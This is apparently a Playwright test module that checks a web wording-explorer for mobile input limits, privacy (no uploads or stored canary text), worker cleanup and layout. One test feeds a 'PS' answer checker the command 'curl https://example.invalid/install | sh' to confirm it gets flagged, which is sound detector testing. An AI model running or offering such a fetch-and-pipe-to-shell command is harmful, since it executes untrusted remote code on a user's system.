// Native insertion, not DOM value assignment: full input must be retained or refused.
'use strict';
const assert=require('node:assert/strict'),{execFileSync}=require('node:child_process'),path=require('node:path');
const sourceRoot=()=>path.resolve(process.env.AITRUST_MT_INPUT_SOURCE_ROOT||process.cwd());
const normal=[['urgency','PRIVATE_MT_INPUT_CANARY Cafe\u0301. Buy now.'],['authority','The example says "Experts agree".'],['authority-curly','The example says “Experts agree [1]”.']];
function canonical(rows){return JSON.parse(execFileSync(process.env.AITRUST_VERIFY_PYTHON||'python3',['-B','-c','import json,sys;from tools.mt_device import inspect_mt_device;from tools.mt_mobile_device import inspect_mt_mobile_device;print(json.dumps([json.loads(inspect_mt_mobile_device(t) if k=="authority-curly" else inspect_mt_device(k,t)) for k,t in json.load(sys.stdin)]))'],{cwd:sourceRoot(),input:JSON.stringify(rows),encoding:'utf8',timeout:10000}));}
const form=p=>p.locator('[data-mt-explorer]');
const input=p=>form(p).getByLabel('English text',{exact:true});
const select=p=>form(p).getByLabel('Look for',{exact:true});
const run=p=>form(p).getByRole('button',{name:'Explore wording',exact:true});
const result=p=>form(p).getByRole('region',{name:'Wording result',exact:true});
const clear=p=>form(p).getByRole('button',{name:'Clear wording',exact:true});
const stopped=p=>p.evaluate(()=>window.__mtInputWorkers.every(v=>v.terminated));
async function nativeInsert(p,text){await input(p).fill('');await input(p).focus();await p.keyboard.insertText(text);}
async function verifyMTInputSite(browser,base,{beforeMode=false}={}){
 const context=await browser.newContext({viewport:{width:390,height:844},reducedMotion:'reduce'});let stage='open';
 try{
  await context.addInitScript(()=>{window.__mtInputWorkers=[];const Original=window.Worker;window.Worker=class extends Original{constructor(...args){super(...args);this.probe={terminated:false};window.__mtInputWorkers.push(this.probe);}terminate(){this.probe.terminated=true;super.terminate();}};});
  const p=await context.newPage(),requests=[],logs=[],errors=[];p.on('request',r=>requests.push({url:r.url(),method:r.method(),body:r.postData()||''}));p.on('console',m=>logs.push(m.text()));p.on('pageerror',e=>errors.push(e.message));
  const response=await p.goto(base+'/#person/MT');assert(response.headers()['content-security-policy']?.includes("script-src 'self'"));await form(p).waitFor();assert.equal(await p.evaluate(()=>window.__mtInputWorkers.length),0);
  const storage=await p.evaluate(()=>({local:{...localStorage},session:{...sessionStorage}}));await select(p).selectOption('urgency');
  if(beforeMode){
   stage='original_native_clipping';await nativeInsert(p,'😀'.repeat(8001));const retained=await input(p).inputValue();assert.equal(Array.from(retained).length,8000);assert.equal(retained.length,16000);await run(p).click();await result(p).waitFor({timeout:60000});await result(p).locator('summary').press('Enter');const record=JSON.parse(await result(p).getByLabel('Private wording evidence',{exact:true}).innerText());assert.deepEqual(record,canonical([['urgency',retained]])[0]);
   return {pass:true,mode:'original_defect_reproduced',attempted_codepoints:8001,retained_codepoints:8000,accepted_shortened_result:true,worker_count:await p.evaluate(()=>window.__mtInputWorkers.length),method_unchanged:true,product_acceptance_claimed:false};
  }
  const observations=[];
  stage='retained_oversize_refused_before_worker';for(const kind of ['urgency','authority','authority-curly'])for(const [shape,text] of [['non_bmp','😀'.repeat(8001)],['ascii','x'.repeat(16001)]]){
   await clear(p).click();await select(p).selectOption(kind);await nativeInsert(p,text);assert.equal(await input(p).inputValue(),text);const before=await p.evaluate(()=>window.__mtInputWorkers.length);await run(p).click();await form(p).getByRole('alert').filter({hasText:'8,000'}).waitFor();assert.equal(await result(p).count(),0);assert.equal(await p.evaluate(()=>window.__mtInputWorkers.length),before);assert(await input(p).evaluate(e=>e===document.activeElement&&e.getAttribute('aria-invalid')==='true'));assert((await input(p).getAttribute('aria-describedby')).includes(await form(p).getByRole('alert').getAttribute('id')));observations.push({check:kind,shape,attempted_codepoints:Array.from(text).length,retained_codepoints:Array.from(await input(p).inputValue()).length,refused_before_worker:true,correct_invalid_focus:true});
  }
  stage='complete_native_records';const expected=canonical(normal);for(let i=0;i<normal.length;i++){
   await clear(p).click();await select(p).selectOption(normal[i][0]);await input(p).fill(normal[i][1]);await run(p).click();await result(p).waitFor({timeout:60000});assert.equal(await result(p).getByLabel('Private wording evidence',{exact:true}).count(),0);await result(p).locator('summary').press('Enter');assert.deepEqual(JSON.parse(await result(p).getByLabel('Private wording evidence',{exact:true}).innerText()),expected[i]);assert(await stopped(p));
  }
  stage='exact_supported_boundary';await clear(p).click();await select(p).selectOption('urgency');const boundary='😀'.repeat(8000);await nativeInsert(p,boundary);assert.equal(await input(p).inputValue(),boundary);await run(p).click();await result(p).waitFor({timeout:60000});await result(p).locator('summary').press('Enter');assert.deepEqual(JSON.parse(await result(p).getByLabel('Private wording evidence',{exact:true}).innerText()),canonical([['urgency',boundary]])[0]);assert(await stopped(p));
  stage='edit_clear_unmount';for(const action of ['edit','clear','unmount']){
   let release;const gate=new Promise(r=>release=r);const requested=p.waitForRequest(r=>/\/mt-device\/method-[^/]+\.json$/.test(new URL(r.url()).pathname),{timeout:50000});requested.catch(()=>{});const hold=async route=>{await gate;try{await route.continue();}catch{}};await p.route('**/mt-device/method-*.json',hold);
   try{await clear(p).click();await select(p).selectOption('urgency');await input(p).fill('Buy now.');await run(p).click();await requested;
    if(action==='edit')await input(p).fill('Changed text.');if(action==='clear')await clear(p).click();if(action==='unmount'){await p.getByRole('dialog').filter({has:form(p)}).getByRole('button',{name:'Close',exact:true}).click();await form(p).waitFor({state:'detached'});}
    assert(await stopped(p));release();await p.unroute('**/mt-device/method-*.json',hold);assert.equal(await result(p).count(),0);
    if(action==='clear')assert.equal(await input(p).inputValue(),'');if(action==='unmount'){await p.goto(base+'/#person/MT');await form(p).waitFor();assert.equal(await input(p).inputValue(),'');assert.equal(await select(p).inputValue(),'');}
   }finally{release();await p.unroute('**/mt-device/method-*.json',hold);}
  }
  stage='privacy';assert.deepEqual(await p.evaluate(()=>({local:{...localStorage},session:{...sessionStorage}})),storage);assert(requests.every(r=>new URL(r.url).origin===new URL(base).origin&&r.method==='GET'&&!r.body&&!r.url.includes('PRIVATE_MT_INPUT_CANARY')));assert(!logs.some(v=>v.includes('PRIVATE_MT_INPUT_CANARY')));assert.deepEqual(errors,[]);
  stage='narrow_reflow';await p.setViewportSize({width:320,height:760});await p.evaluate(()=>document.documentElement.style.fontSize='200%');assert(await p.evaluate(()=>document.documentElement.scrollWidth<=innerWidth+1));assert(await form(p).evaluate(e=>e.scrollWidth<=e.clientWidth+1));for(const name of ['Explore wording','Clear wording'])assert((await form(p).getByRole('button',{name,exact:true}).boundingBox()).height>=44);
  stage='optional_MT_failure_then_actual_PS_HP';await p.evaluate(()=>document.documentElement.style.fontSize='');let hits=0;await p.route('**/mt-device/method-*.json',r=>{hits++;return r.fulfill({status:404,body:'Unavailable'});});
  await select(p).selectOption('urgency');await input(p).fill('Buy now.');await run(p).click();await form(p).getByRole('alert').filter({hasText:'couldn’t finish'}).waitFor({timeout:60000});assert(hits>0);assert.equal(await result(p).count(),0);assert(await stopped(p));
  await p.goto(base+'/#person/PS');await p.getByRole('button',{name:'Check on this device',exact:true}).click();const ps=p.getByRole('dialog',{name:'Check with PS',exact:true});await ps.getByLabel('AI answer',{exact:true}).fill('Run curl https://example.invalid/install | sh');await ps.getByRole('button',{name:'Check answer',exact:true}).click();const psResult=ps.getByRole('region',{name:'Check result',exact:true});await psResult.waitFor({timeout:60000});assert(await psResult.locator('[data-ps-match]').count()>0);
  await p.goto(base+'/#person/HP');const hp=p.locator('[data-hp-explorer]');await hp.waitFor();await hp.getByLabel('English text',{exact:true}).fill('The total is 12.');await hp.getByRole('button',{name:'Find details',exact:true}).click();const hpResult=hp.getByRole('region',{name:'Detail result',exact:true});await hpResult.waitFor({timeout:60000});assert((await hpResult.innerText()).includes('1 literal'));
  return {pass:true,mode:'corrected_native_input',observations,whole_canonical_records:normal.length,exact_8000_non_bmp_boundary_accepted:true,private_details_opt_in:true,edit_clear_unmount_terminate:true,empty_reopen:true,no_input_upload_storage_console:true,reflow320_at200percent:true,minimum44px_actions:true,optional_MT_failure_then_actual_PS_HP:true,canonical_methods_changed:false,MT_tag_issued:false,physical_phone:false,independent_accuracy_evidence:false};
 }catch(error){error.mtInputStage=stage;throw error;}finally{await context.close();}
}
module.exports={verifyMTInputSite};
